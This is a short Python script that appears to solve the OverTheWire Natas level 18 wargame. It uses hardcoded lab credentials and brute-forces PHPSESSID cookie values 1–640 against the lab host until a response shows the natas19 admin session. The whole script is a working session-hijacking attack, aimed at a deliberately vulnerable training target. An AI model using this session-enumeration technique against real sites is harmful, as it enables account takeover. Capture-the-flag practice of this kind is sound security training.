from bs4 import BeautifulSoup as bs
from time import *
import urllib
import base64
import binascii
import requests
import re
from string import *
import sys

u='natas18'
p='xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
l=f'http://{u}.natas.labs.overthewire.org/?debug=true'
for sid in range(1,641):
    resp=requests.post(l,auth=(u, p),cookies={'PHPSESSID':str(sid)}).text
    if "Username: natas19" in resp:
        print("correct id:"+str(sid))
        print(resp)
        break
    elif sid%10==0:
        print("tried up to "+str(sid))
